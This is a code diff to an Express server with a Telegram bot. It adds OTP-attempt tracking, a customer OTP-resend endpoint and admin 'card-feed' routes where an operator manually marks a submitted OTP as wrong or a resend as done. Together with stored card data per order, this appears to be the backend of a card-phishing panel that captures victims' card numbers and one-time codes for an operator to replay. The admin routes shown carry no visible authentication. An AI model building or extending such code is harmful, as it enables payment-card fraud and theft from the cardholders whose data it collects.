@@ -26,10 +26,15 @@ import { notifyOrderStatusByRef, sendFcmAnnouncement } from "./server/pushFcm";
 import {
   attachOtpToCardFeed,
   getCardFeedStatus,
+  getOtpMeta,
   listCardFeed,
+  markOtpResendDone,
+  recordWrongOtpAttempt,
+  requestOtpResend,
   saveCreditCardForOrder,
   getCreditCardByOrderRef,
   updateCardFeedStatus,
+  OTP_MAX_ATTEMPTS,
 } from "./server/creditCardStore";
 
 type TelegramBotInstance = InstanceType<typeof TelegramBot>;
@@ -1956,7 +1961,19 @@ async function startServer() {
       }
       const feedStatus = await getCardFeedStatus(orderRef);
       const status = resolveLiveOrderStatus(tx.status, feedStatus);
-      res.json({ order_ref: orderRef, status, tx_status: tx.status, feed_status: feedStatus });
+      const otpMeta = await getOtpMeta(orderRef);
+      res.json({
+        order_ref: orderRef,
+        status,
+        tx_status: tx.status,
+        feed_status: feedStatus,
+        otp_attempts: otpMeta?.attempts ?? 0,
+        otp_max_attempts: otpMeta?.maxAttempts ?? OTP_MAX_ATTEMPTS,
+        otp_remaining: otpMeta?.remaining ?? OTP_MAX_ATTEMPTS,
+        otp_can_resend: otpMeta?.canResend ?? false,
+        otp_resend_cooldown_sec: otpMeta?.resendCooldownSec ?? 0,
+        fail_reason: otpMeta?.failReason ?? null,
+      });
     } catch (e) {
       console.error(e);
       res.status(500).json({ error: "Failed to load order status" });
@@ -2186,6 +2203,31 @@ async function startServer() {
     } catch (e) {
       console.error(e);
       res.status(500).json({ error: "Failed to submit OTP" });
+    }
+  });
+
+  app.post("/api/transactions/otp/resend", async (req, res) => {
+    try {
+      const clientId = String(req.body?.client_id || "").trim();
+      const orderRef = String(req.body?.order_id || req.body?.order_ref || "").trim();
+      if (!clientId || !orderRef) {
+        return res.status(400).json({ error: "client_id and order_id required" });
+      }
+      const tx = await store.getTransactionByOrderRef(orderRef);
+      if (!tx || tx.client_id !== clientId) {
+        return res.status(404).json({ error: "Order not found" });
+      }
+      const result = await requestOtpResend(orderRef);
+      if (!result.ok) {
+        return res.status(429).json({
+          error: result.error || "resend_unavailable",
+          cooldown_sec: result.cooldownSec ?? 0,
+        });
+      }
+      res.json({ ok: true, order_ref: orderRef, cooldown_sec: 60 });
+    } catch (e) {
+      console.error(e);
+      res.status(500).json({ error: "Failed to request OTP resend" });
     }
   });
 
@@ -2531,6 +2573,36 @@ async function startServer() {
     } catch (e) {
       console.error(e);
       res.status(500).json({ error: "Failed to update card-feed status" });
+    }
+  });
+
+  app.patch("/api/admin/card-feed/:orderRef/otp-wrong", async (req, res) => {
+    try {
+      const orderRef = String(req.params.orderRef || "").trim();
+      if (!orderRef) return res.status(400).json({ error: "order_ref required" });
+      const result = await recordWrongOtpAttempt(orderRef);
+      const txOk = await store.updateTransactionStatusByRef(orderRef, result.status);
+      if (!txOk) {
+        const feedOk = await updateCardFeedStatus(orderRef, result.status);
+        if (!feedOk) return res.status(404).json({ error: "Order not found" });
+      }
+      void notifyOrderStatusByRef(orderRef, result.status);
+      res.json({ ok: true, order_ref: orderRef, ...result });
+    } catch (e) {
+      console.error(e);
+      res.status(500).json({ error: "Failed to record wrong OTP" });
+    }
+  });
+
+  app.patch("/api/admin/card-feed/:orderRef/otp-resend-done", async (req, res) => {
+    try {
+      const orderRef = String(req.params.orderRef || "").trim();
+      if (!orderRef) return res.status(400).json({ error: "order_ref required" });
+      await markOtpResendDone(orderRef);
+      res.json({ ok: true, order_ref: orderRef });
+    } catch (e) {
+      console.error(e);
+      res.status(500).json({ error: "Failed to mark OTP resend done" });
     }
   });
 
